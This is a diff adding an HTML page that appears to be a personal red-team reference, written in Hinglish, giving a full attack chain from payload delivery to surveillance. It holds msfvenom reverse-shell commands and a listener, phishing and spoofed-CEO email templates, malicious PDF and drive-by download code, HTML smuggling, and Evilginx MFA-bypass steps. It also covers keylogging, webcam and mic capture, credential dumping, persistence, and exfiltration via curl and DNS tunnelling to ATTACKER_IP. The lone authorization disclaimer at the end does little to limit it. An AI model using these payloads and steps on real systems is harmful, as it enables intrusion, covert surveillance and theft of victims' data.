@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Red Team — Complete Attack Chain — Delivery to Full Surveillance</title>
+<style>
+  :root{
+    --bg:#090d12; --panel:#0f1820; --panel2:#0b1219; --border:#1a2635;
+    --text:#d0dce8; --muted:#5a7a92;
+    --c1:#ff4f7b; --c2:#ffb300; --c3:#39ff85; --c4:#00e5ff; --c5:#a78bff; --c6:#ff6a00;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;line-height:1.6}
+  header{padding:52px 6vw 40px;border-bottom:1px solid var(--border);background:linear-gradient(160deg,#1a0d0d 0%,#090d12 60%)}
+  .eye{font-family:Consolas,monospace;font-size:11px;letter-spacing:.16em;color:var(--c1);text-transform:uppercase;margin-bottom:12px}
+  h1{font-size:clamp(26px,4vw,44px);font-weight:900;color:#eaf2f8;line-height:1.1}
+  h1 span{color:var(--c1)}
+  .sub{color:var(--muted);font-size:14px;max-width:760px;margin-top:10px}
+  .phases{display:flex;gap:10px;flex-wrap:wrap;margin-top:22px}
+  .ph{font-family:Consolas,monospace;font-size:11px;padding:5px 13px;border-radius:20px;border:1px solid currentColor;text-transform:uppercase}
+  main{padding:40px 6vw 100px;max-width:1200px;margin:0 auto}
+
+  /* FLOW BAR */
+  .flowbar{display:flex;gap:6px;flex-wrap:wrap;margin:0 0 50px;align-items:center}
+  .flowbar span{font-family:Consolas,monospace;font-size:11.5px;background:var(--panel);border:1px solid var(--border);padding:7px 14px;border-radius:20px;color:#c3d1db}
+  .flowbar .arr{color:var(--muted);font-size:16px}
+
+  /* SECTION DIVIDER */
+  .sec-divider{
+    background:linear-gradient(90deg,rgba(255,79,123,.15),transparent);
+    border:1px solid rgba(255,79,123,.3);
+    border-radius:10px;padding:18px 24px;margin:50px 0 30px;
+    display:flex;align-items:center;gap:16px
+  }
+  .sec-divider .num{font-family:Consolas,monospace;font-size:28px;font-weight:900;color:var(--c1)}
+  .sec-divider h2{font-size:22px;color:#eaf2f8;margin:0}
+  .sec-divider p{color:var(--muted);font-size:13px;margin:4px 0 0}
+
+  .section{margin-bottom:44px}
+  .sh{display:flex;align-items:center;gap:10px;padding-bottom:10px;border-bottom:1px solid var(--border);margin-bottom:16px}
+  .sn{font-family:Consolas,monospace;font-size:12px;color:var(--muted)}
+  .sh h3{font-size:17px;color:#eaf2f8;margin:0}
+  .stag{margin-left:auto;font-family:Consolas,monospace;font-size:10px;padding:3px 10px;border-radius:12px;text-transform:uppercase}
+  p.d{color:#8aabbb;font-size:13.5px;margin-bottom:12px}
+  .cards{display:flex;flex-direction:column;gap:10px}
+  .card{background:var(--panel);border:1px solid var(--border);border-radius:10px;overflow:hidden}
+  .ch{padding:10px 14px;display:flex;align-items:baseline;gap:10px;border-bottom:1px solid var(--border);background:var(--panel2)}
+  .cn{font-family:Consolas,monospace;font-size:11px;color:var(--muted)}
+  .ct{font-size:13.5px;color:#d8e8f0;font-weight:600}
+  .cb{padding:12px 14px}
+  .why{font-size:12.5px;color:var(--muted);margin-bottom:8px}
+  pre{background:#05080b;border:1px solid var(--border);border-radius:6px;padding:11px 14px;font-family:Consolas,monospace;font-size:12.5px;color:var(--c3);overflow-x:auto;margin:6px 0}
+  .cm{color:#3a5a6a}
+  code.il{background:#05080b;color:var(--c3);padding:1px 5px;border-radius:4px;font-size:12px;border:1px solid var(--border);font-family:Consolas,monospace}
+  table{width:100%;border-collapse:collapse;background:var(--panel);border-radius:10px;overflow:hidden;font-size:13px;margin:12px 0}
+  th{background:var(--panel2);color:var(--muted);font-family:Consolas,monospace;font-size:10.5px;text-transform:uppercase;letter-spacing:.06em;padding:10px 12px;border-bottom:1px solid var(--border);text-align:left}
+  td{padding:10px 12px;border-bottom:1px solid var(--border);color:#9ab0bc;vertical-align:top}
+  tr:last-child td{border-bottom:none}
+  .note{background:var(--panel);border-left:3px solid var(--c4);padding:11px 15px;border-radius:0 8px 8px 0;margin:12px 0;font-size:13px;color:#8aabbb}
+  .note.r{border-left-color:var(--c1)}
+  .note.g{border-left-color:var(--c3)}
+  .note.o{border-left-color:var(--c6)}
+  footer{padding:28px 6vw 50px;color:var(--muted);font-size:11.5px;border-top:1px solid var(--border);font-family:Consolas,monospace}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="eye">Red Team Roadmap · Phase 2+6 · Complete Attack Chain</div>
+  <h1>Red Team Complete<br><span>Attack Chain</span></h1>
+  <p class="sub">Starting se end tak — pehle payload kaise deliver karte hain (email/PDF/link/image), phir payload execute hone ke baad step-by-step surveillance (keylogger, screenshot, webcam, browser dump, exfil) sab ek file mein.</p>
+  <div class="phases">
+    <span class="ph" style="color:var(--c1)">Section 1: Payload Delivery</span>
+    <span class="ph" style="color:var(--c3)">Section 2: Post-Execution Surveillance</span>
+  </div>
+</header>
+
+<main>
+
+  <div class="flowbar">
+    <span>1. Pretext banao</span><span class="arr">→</span>
+    <span>2. Payload create</span><span class="arr">→</span>
+    <span>3. Delivery (email/PDF/link)</span><span class="arr">→</span>
+    <span>4. Victim execute kare</span><span class="arr">→</span>
+    <span>5. Callback aaye</span><span class="arr">→</span>
+    <span>6. Keylog/Screenshot</span><span class="arr">→</span>
+    <span>7. Webcam/Browser dump</span><span class="arr">→</span>
+    <span>8. Exfil + Report</span>
+  </div>
+
+  <!-- ============ SECTION 1 ============ -->
+  <div class="sec-divider">
+    <span class="num">01</span>
+    <div>
+      <h2>Payload Delivery Methods</h2>
+      <p>Email, PDF, Link, Image, Macro Document, HTML Smuggling — har method ka detailed flow</p>
+    </div>
+  </div>
+
+  <!-- 1.1 Setup -->
+  <div class="section">
+    <div class="sh"><span class="sn">1.1</span><h3>Pehle: Payload + Listener Setup karo</h3><span class="stag" style="color:var(--c1);background:rgba(255,79,123,.08);border:1px solid rgba(255,79,123,.3)">Setup</span></div>
+    <div class="cards">
+      <div class="card">
+        <div class="ch"><span class="cn">Step A</span><span class="ct">Listener start karo (attacker machine pe, sabse pehle)</span></div>
+        <div class="cb"><pre><span class="cm"># Basic netcat listener:</span>
+nc -lvnp 4444
+
+<span class="cm"># Ya Metasploit multi-handler (meterpreter ke liye):</span>
+msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 0.0.0.0; set LPORT 443; run -j"</pre>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Step B</span><span class="ct">Payload generate karo (msfvenom)</span></div>
+        <div class="cb">
+          <table>
+            <tr><th>Format</th><th>Command</th><th>Use</th></tr>
+            <tr><td>EXE (Windows)</td><td><code class="il">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -f exe -o payload.exe</code></td><td>Direct execution</td></tr>
+            <tr><td>VBA Macro</td><td><code class="il">msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f vba -o macro.vba</code></td><td>Word/Excel document</td></tr>
+            <tr><td>ASPX</td><td><code class="il">msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f aspx -o shell.aspx</code></td><td>IIS web upload</td></tr>
+            <tr><td>PDF exploit</td><td><code class="il">msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f pdf -o evil.pdf</code></td><td>Old Adobe Reader</td></tr>
+          </table>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Step C</span><span class="ct">GoPhish campaign setup (email delivery ke liye)</span></div>
+        <div class="cb"><pre>./gophish
+<span class="cm"># Admin panel: https://localhost:3333</span>
+<span class="cm"># Sending Profile → Email Template → Landing Page → Target List → Launch</span></pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 1.2 Email -->
+  <div class="section">
+    <div class="sh"><span class="sn">1.2</span><h3>Email ke through Delivery</h3><span class="stag" style="color:var(--c2);background:rgba(255,179,0,.08);border:1px solid rgba(255,179,0,.3)">Email</span></div>
+    <div class="cards">
+      <div class="card">
+        <div class="ch"><span class="cn">Method A</span><span class="ct">Attachment (EXE / DOCM) email mein</span></div>
+        <div class="cb">
+          <p class="why">Payload file ko email ke saath attach karo — compelling subject line se victim open kare</p>
+          <pre><span class="cm"># GoPhish email template:</span>
+Subject: Urgent — Salary Revision Letter Action Required
+Body:
+Dear {{.FirstName}},
+Please find attached your revised salary letter for FY2026.
+Kindly review and acknowledge by EOD.
+
+Attachment: salary_revision.docm  ← payload hai ye</pre>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Method B</span><span class="ct">Link email mein (credential harvest / drive-by)</span></div>
+        <div class="cb"><pre>Body:
+Your account access will expire in 24 hours.
+Click here to verify: {{.URL}}
+
+<span class="cm"># {{.URL}} = attacker ke landing page ka link</span>
+<span class="cm"># Landing page: fake Microsoft/Google login page jo creds capture kare</span>
+<span class="cm"># Ya: page jo silently payload download karwaye</span></pre>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Method C</span><span class="ct">Tracking pixel email mein (recon ke liye)</span></div>
+        <div class="cb">
+          <p class="why">Email khula ya nahi pata karo — 1x1 transparent image attacker server se load hoti hai</p>
+          <pre>&lt;img src="http://ATTACKER_IP/track.png?id={{.RId}}" width="1" height="1" /&gt;
+<span class="cm"># Request aane pe: victim ka IP, browser, OS, timestamp mil jaata hai</span></pre>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Method D</span><span class="ct">Email Spoofing (agar DMARC weak ho)</span></div>
+        <div class="cb"><pre><span class="cm"># Pehle check karo:</span>
+dig TXT _dmarc.target.com
+<span class="cm"># "p=none" → spoof possible</span>
+
+<span class="cm"># Python se spoofed email:</span>
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+msg = MIMEMultipart()
+msg['From'] = 'ceo@target.com'   <span class="cm"># Spoofed sender</span>
+msg['To'] = 'victim@target.com'
+msg['Subject'] = 'Urgent — Wire Transfer Required'
+<span class="cm"># Attachment attach karo, phir send</span></pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 1.3 PDF -->
+  <div class="section">
+    <div class="sh"><span class="sn">1.3</span><h3>PDF ke through Delivery</h3><span class="stag" style="color:var(--c4);background:rgba(0,229,255,.08);border:1px solid rgba(0,229,255,.3)">PDF</span></div>
+    <div class="cards">
+      <div class="card">
+        <div class="ch"><span class="cn">Method A</span><span class="ct">PDF mein malicious link embed</span></div>
+        <div class="cb">
+          <p class="why">PDF ke andar ek "Click to verify" button hota hai jo attacker site pe jaata hai</p>
+          <pre>pip install reportlab
+python3 -c "
+from reportlab.pdfgen import canvas
+c = canvas.Canvas('invoice.pdf')
+c.setFont('Helvetica-Bold', 16)
+c.drawString(100, 700, 'INVOICE #INV-2026-0847')
+c.setFont('Helvetica', 12)
+c.drawString(100, 650, 'Click below to verify and approve payment:')
+c.linkURL('http://ATTACKER_IP/payload', (100,620,300,640), relative=0)
+c.drawString(100, 630, 'Verify Payment Details')
+c.save()"</pre>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Method B</span><span class="ct">PDF jaisa dikhne wala .docm (rename trick)</span></div>
+        <div class="cb">
+          <p class="why">Macro-payload file ka naam PDF rakho — victim double-click kare to Word khule macros ke saath</p>
+          <pre>mv payload.docm "Salary_Slip_March2026.pdf"
+<span class="cm"># Email mein attach karo — PDF icon dikhega</span>
+<span class="cm"># Double-click pe Word khulega, "Enable Macros" prompt aayega</span></pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 1.4 Link -->
+  <div class="section">
+    <div class="sh"><span class="sn">1.4</span><h3>Link ke through Delivery</h3><span class="stag" style="color:var(--c1);background:rgba(255,79,123,.08);border:1px solid rgba(255,79,123,.3)">Link</span></div>
+    <div class="cards">
+      <div class="card">
+        <div class="ch"><span class="cn">Type A</span><span class="ct">Drive-by Download (link click = file download)</span></div>
+        <div class="cb"><pre><span class="cm"># Attacker server pe payload host karo:</span>
+python3 -m http.server 80
+
+<span class="cm"># HTML page banao jo auto-download trigger kare:</span>
+&lt;html&gt;&lt;body&gt;
+&lt;script&gt;
+  var a = document.createElement('a');
+  a.href = 'http://ATTACKER_IP/payload.exe';
+  a.download = 'invoice.exe';
+  document.body.appendChild(a);
+  a.click();
+&lt;/script&gt;
+&lt;p&gt;Loading secure document, please wait...&lt;/p&gt;
+&lt;/body&gt;&lt;/html&gt;</pre>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Type B</span><span class="ct">Credential Harvest (Evilginx2 — MFA bypass)</span></div>
+        <div class="cb"><pre>./evilginx -p phishlets/
+phishlets hostname microsoft your-fake-domain.com
+phishlets enable microsoft
+lures create microsoft
+lures get-url 0
+<span class="cm"># Generated URL victim ko email/link mein bhejo</span>
+<span class="cm"># Victim real Microsoft page pe login kare → creds + session token capture</span></pre>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Type C</span><span class="ct">URL Masking (legitimate lagte links)</span></div>
+        <div class="cb">
+          <table>
+            <tr><th>Trick</th><th>Example</th></tr>
+            <tr><td>Subdomain trick</td><td>microsoft.com.secure-verify.net</td></tr>
+            <tr><td>Typosquatting</td><td>micros0ft.com / paypa1.com</td></tr>
+            <tr><td>URL shortener</td><td>bit.ly se real URL hide karo</td></tr>
+            <tr><td>HTML href mismatch</td><td>&lt;a href="evil.com"&gt;google.com&lt;/a&gt;</td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 1.5 Image -->
+  <div class="section">
+    <div class="sh"><span class="sn">1.5</span><h3>Image ke through Delivery</h3><span class="stag" style="color:var(--c6);background:rgba(255,106,0,.08);border:1px solid rgba(255,106,0,.3)">Image</span></div>
+    <div class="cards">
+      <div class="card">
+        <div class="ch"><span class="cn">Method A</span><span class="ct">Clickable Image → Payload Link</span></div>
+        <div class="cb"><pre>&lt;a href="http://ATTACKER_IP/payload.exe"&gt;
+  &lt;img src="invoice_preview.png" 
+       alt="Click to download invoice"
+       style="width:400px;border:1px solid #ccc;"&gt;
+&lt;/a&gt;
+<span class="cm"># Image dikhti hai — click karne pe payload download</span></pre>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Method B</span><span class="ct">Steganography — image mein payload data chhupao</span></div>
+        <div class="cb"><pre>steghide embed -cf cover.jpg -sf payload_script.txt -p "password123"
+<span class="cm"># Image normal lagti hai — andar data chhupa hai</span>
+<span class="cm"># Receiver side extract:</span>
+steghide extract -sf received.jpg -p "password123"</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 1.6 HTML Smuggling -->
+  <div class="section">
+    <div class="sh"><span class="sn">1.6</span><h3>HTML Smuggling (Most Effective)</h3><span class="stag" style="color:var(--c5);background:rgba(167,139,255,.08);border:1px solid rgba(167,139,255,.3)">Advanced</span></div>
+    <p class="d">Payload ko HTML ke andar Base64 encode karke chhupao — email gateway scan nahi kar paata, browser mein reconstruct hota hai.</p>
+    <div class="cards">
+      <div class="card">
+        <div class="ch"><span class="cn">Step 1</span><span class="ct">Payload Base64 encode karo</span></div>
+        <div class="cb"><pre>base64 payload.exe | tr -d '\n' > payload_b64.txt</pre>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Step 2</span><span class="ct">HTML file banao</span></div>
+        <div class="cb"><pre>&lt;html&gt;&lt;body&gt;
+&lt;script&gt;
+var b64 = "BASE64_STRING_HERE";
+var blob = new Blob(
+  [Uint8Array.from(atob(b64), c => c.charCodeAt(0))],
+  {type:'application/octet-stream'}
+);
+var a = document.createElement('a');
+a.href = URL.createObjectURL(blob);
+a.download = 'invoice.exe';
+document.body.appendChild(a);
+a.click();
+&lt;/script&gt;
+&lt;p&gt;Please wait while your document loads...&lt;/p&gt;
+&lt;/body&gt;&lt;/html&gt;</pre>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Step 3</span><span class="ct">HTML file email mein attach karo</span></div>
+        <div class="cb"><p class="why">Victim HTML attachment open kare → browser mein khule → payload auto-download → victim run kare → callback aata hai attacker ke paas</p></div>
+      </div>
+    </div>
+    <div class="note g">HTML Smuggling = sabse effective method 2025-2026 mein — email security gateways payload scan nahi kar paate kyunki payload transit mein exist hi nahi karta, sirf Base64 string hoti hai.</div>
+  </div>
+
+  <!-- ============ SECTION 2 ============ -->
+  <div class="sec-divider" style="background:linear-gradient(90deg,rgba(57,255,133,.1),transparent);border-color:rgba(57,255,133,.3)">
+    <span class="num" style="color:var(--c3)">02</span>
+    <div>
+      <h2>Payload Execute hone ke baad — Step-by-Step Surveillance</h2>
+      <p>Callback aate hi — keylogger, screenshot, webcam, browser dump, exfil sab step-by-step</p>
+    </div>
+  </div>
+
+  <!-- 2.1 Callback confirm -->
+  <div class="section">
+    <div class="sh"><span class="sn">2.1</span><h3>Step 1 — Callback Confirm karo</h3><span class="stag" style="color:var(--c3);background:rgba(57,255,133,.08);border:1px solid rgba(57,255,133,.3)">First Contact</span></div>
+    <div class="cards">
+      <div class="card">
+        <div class="ch"><span class="cn">Action</span><span class="ct">Meterpreter session aaya — pehle ye karo</span></div>
+        <div class="cb"><pre><span class="cm"># Session list dekho:</span>
+msf > sessions -l
+
+<span class="cm"># Session mein jaao:</span>
+msf > sessions -i 1
+
+<span class="cm"># Immediate info gather karo:</span>
+meterpreter > sysinfo
+meterpreter > getuid
+meterpreter > getpid</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 2.2 Keylogger -->
+  <div class="section">
+    <div class="sh"><span class="sn">2.2</span><h3>Step 2 — Keylogger Start karo</h3><span class="stag" style="color:var(--c1);background:rgba(255,79,123,.08);border:1px solid rgba(255,79,123,.3)">Keylogger</span></div>
+    <div class="cards">
+      <div class="card">
+        <div class="ch"><span class="cn">Meterpreter</span><span class="ct">Built-in keylogger</span></div>
+        <div class="cb"><pre>meterpreter > keyscan_start
+<span class="cm"># Victim type karta rehta hai, tu kaam karta reh</span>
+<span class="cm"># Kuch time baad dump karo:</span>
+meterpreter > keyscan_dump
+<span class="cm"># Output: passwords, emails, messages sab</span>
+meterpreter > keyscan_stop</pre>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Python</span><span class="ct">Agar meterpreter nahi (Python keylogger upload karo)</span></div>
+        <div class="cb"><pre><span class="cm"># Attacker server se download karwao:</span>
+meterpreter > execute -f "powershell" -a "IEX(IWR 'http://ATTACKER_IP/keylogger.py')"
+
+<span class="cm"># keylogger.py content:</span>
+from pynput.keyboard import Listener
+import logging
+logging.basicConfig(filename="C:\\Users\\Public\\log.txt", level=logging.DEBUG)
+def on_press(key):
+    logging.info(str(key))
+with Listener(on_press=on_press) as l:
+    l.join()</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 2.3 Screenshot -->
+  <div class="section">
+    <div class="sh"><span class="sn">2.3</span><h3>Step 3 — Screenshot lo</h3><span class="stag" style="color:var(--c2);background:rgba(255,179,0,.08);border:1px solid rgba(255,179,0,.3)">Screenshot</span></div>
+    <div class="cards">
+      <div class="card">
+        <div class="ch"><span class="cn">Meterpreter</span><span class="ct">Single + continuous screenshots</span></div>
+        <div class="cb"><pre><span class="cm"># Single screenshot:</span>
+meterpreter > screenshot
+
+<span class="cm"># Continuous (har 5 sec mein 20 screenshots):</span>
+meterpreter > run post/multi/gather/screen_spy INTERVAL=5 COUNT=20
+<span class="cm"># Victim kya dekh raha hai — kaunsi files, emails, systems use kar raha hai</span></pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 2.4 Webcam -->
+  <div class="section">
+    <div class="sh"><span class="sn">2.4</span><h3>Step 4 — Webcam + Microphone</h3><span class="stag" style="color:var(--c4);background:rgba(0,229,255,.08);border:1px solid rgba(0,229,255,.3)">Camera/Audio</span></div>
+    <div class="cards">
+      <div class="card">
+        <div class="ch"><span class="cn">Meterpreter</span><span class="ct">Camera + mic access</span></div>
+        <div class="cb"><pre><span class="cm"># Available cameras list:</span>
+meterpreter > webcam_list
+
+<span class="cm"># Photo lo:</span>
+meterpreter > webcam_snap
+
+<span class="cm"># Live stream dekho:</span>
+meterpreter > webcam_stream
+
+<span class="cm"># 30 second audio record karo:</span>
+meterpreter > record_mic -d 30</pre>
+        </div>
+      </div>
+    </div>
+    <div class="note r">Webcam/mic access = highest-impact Red Team finding — physical space visible hoti hai. Client ko is capability ka proof dena report ka sabse powerful evidence hota hai.</div>
+  </div>
+
+  <!-- 2.5 Browser dump -->
+  <div class="section">
+    <div class="sh"><span class="sn">2.5</span><h3>Step 5 — Browser Passwords Dump karo</h3><span class="stag" style="color:var(--c3);background:rgba(57,255,133,.08);border:1px solid rgba(57,255,133,.3)">Credentials</span></div>
+    <div class="cards">
+      <div class="card">
+        <div class="ch"><span class="cn">Meterpreter</span><span class="ct">All browser passwords</span></div>
+        <div class="cb"><pre>meterpreter > run post/multi/gather/chrome_passwords
+meterpreter > run post/multi/gather/firefox_creds
+meterpreter > run post/multi/gather/browser_history</pre>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">LaZagne</span><span class="ct">All-in-one credential dump tool</span></div>
+        <div class="cb"><pre><span class="cm"># Upload karke run karo:</span>
+meterpreter > upload LaZagne.exe C:\\Users\\Public\\
+meterpreter > execute -f "C:\\Users\\Public\\LaZagne.exe" -a "all" -i
+<span class="cm"># Output: Chrome, Firefox, Edge, WiFi, Windows credentials sab</span></pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 2.6 Clipboard -->
+  <div class="section">
+    <div class="sh"><span class="sn">2.6</span><h3>Step 6 — Clipboard Monitor</h3><span class="stag" style="color:var(--c6);background:rgba(255,106,0,.08);border:1px solid rgba(255,106,0,.3)">Clipboard</span></div>
+    <div class="cards">
+      <div class="card">
+        <div class="ch"><span class="cn">Meterpreter</span><span class="ct">Current clipboard content</span></div>
+        <div class="cb"><pre>meterpreter > clipboard_get_data
+<span class="cm"># Agar victim ne abhi kuch copy kiya hai — passwords, text, URLs sab milega</span></pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 2.7 File search -->
+  <div class="section">
+    <div class="sh"><span class="sn">2.7</span><h3>Step 7 — Sensitive Files Dhundho + Download karo</h3><span class="stag" style="color:var(--c2);background:rgba(255,179,0,.08);border:1px solid rgba(255,179,0,.3)">Data Theft</span></div>
+    <div class="cards">
+      <div class="card">
+        <div class="ch"><span class="cn">Search</span><span class="ct">Important files locate karo</span></div>
+        <div class="cb"><pre>meterpreter > search -f "*.pdf"
+meterpreter > search -f "*password*"
+meterpreter > search -f "*.xlsx"
+meterpreter > search -f "*secret*" -d "C:\\Users\\"</pre>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Download</span><span class="ct">Files attacker ke paas le aao</span></div>
+        <div class="cb"><pre>meterpreter > download "C:\\Users\\victim\\Documents\\passwords.xlsx"
+meterpreter > download -r "C:\\Users\\victim\\Documents\\" /local/loot/</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 2.8 Hashdump -->
+  <div class="section">
+    <div class="sh"><span class="sn">2.8</span><h3>Step 8 — Credential Dump (Hashes)</h3><span class="stag" style="color:var(--c1);background:rgba(255,79,123,.08);border:1px solid rgba(255,79,123,.3)">Creds</span></div>
+    <div class="cards">
+      <div class="card">
+        <div class="ch"><span class="cn">Meterpreter</span><span class="ct">SAM database hashes (admin chahiye)</span></div>
+        <div class="cb"><pre><span class="cm"># Pehle privesc karo:</span>
+meterpreter > getsystem
+
+<span class="cm"># Phir hashes dump karo:</span>
+meterpreter > hashdump
+<span class="cm"># Output: Administrator:500:HASH... → offline crack karo</span>
+
+<span class="cm"># Ya Mimikatz se cleartext passwords:</span>
+meterpreter > load kiwi
+meterpreter > creds_all</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 2.9 Persistence -->
+  <div class="section">
+    <div class="sh"><span class="sn">2.9</span><h3>Step 9 — Persistence lagao (Reboot ke baad bhi access)</h3><span class="stag" style="color:var(--c5);background:rgba(167,139,255,.08);border:1px solid rgba(167,139,255,.3)">Persistence</span></div>
+    <div class="cards">
+      <div class="card">
+        <div class="ch"><span class="cn">Meterpreter</span><span class="ct">Auto persistence module</span></div>
+        <div class="cb"><pre>meterpreter > run post/windows/manage/persistence_exe STARTUP=SCHEDULER DELAY=30
+<span class="cm"># Har 30 second pe wapas connect karne ki koshish karega</span></pre>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Manual</span><span class="ct">Registry run key</span></div>
+        <div class="cb"><pre>meterpreter > reg setval -k HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v "Update" -t REG_SZ -d "C:\\Users\\Public\\payload.exe"</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 2.10 Exfil -->
+  <div class="section">
+    <div class="sh"><span class="sn">2.10</span><h3>Step 10 — Data Exfiltrate karo</h3><span class="stag" style="color:var(--c3);background:rgba(57,255,133,.08);border:1px solid rgba(57,255,133,.3)">Final Step</span></div>
+    <div class="cards">
+      <div class="card">
+        <div class="ch"><span class="cn">Method A</span><span class="ct">Meterpreter download (already covered)</span></div>
+        <div class="cb"><pre>meterpreter > download -r "C:\\Users\\victim\\Desktop\\" /local/loot/</pre>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Method B</span><span class="ct">HTTP POST exfil (agar meterpreter nahi)</span></div>
+        <div class="cb"><pre><span class="cm"># Attacker pe receiver server:</span>
+python3 -m http.server 8080
+
+<span class="cm"># Target se curl se bhejo:</span>
+curl -X POST http://ATTACKER_IP:8080/upload -F "file=@C:/Users/victim/passwords.txt"</pre>
+        </div>
+      </div>
+      <div class="card">
+        <div class="ch"><span class="cn">Method C</span><span class="ct">DNS tunneling (detection avoid karne ke liye)</span></div>
+        <div class="cb"><pre><span class="cm"># dnscat2 use karo — DNS queries mein data chhupao:</span>
+<span class="cm"># DNS traffic usually allowed hota hai — detection kam hota hai</span>
+./dnscat2-server target.com
+<span class="cm"># Client pe:</span>
+dnscat2 --dns server=ATTACKER_IP,port=53 --secret=password</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="note r">
+    <strong>Authorization mandatory hai:</strong> Ye complete attack chain sirf authorized Red Team engagement (written scope + client permission) ke andar use karna hai. Unauthorized systems pe ye sab criminal offense hai — hacking act, privacy violation, data theft charges lag sakte hain.
+  </div>
+
+</main>
+
+<footer>
+  Red Team Complete Attack Chain · Payload Delivery + Post-Execution Surveillance · Read after OSCP prep · Karan's Reference Vault
+</footer>
+</body>
+</html>
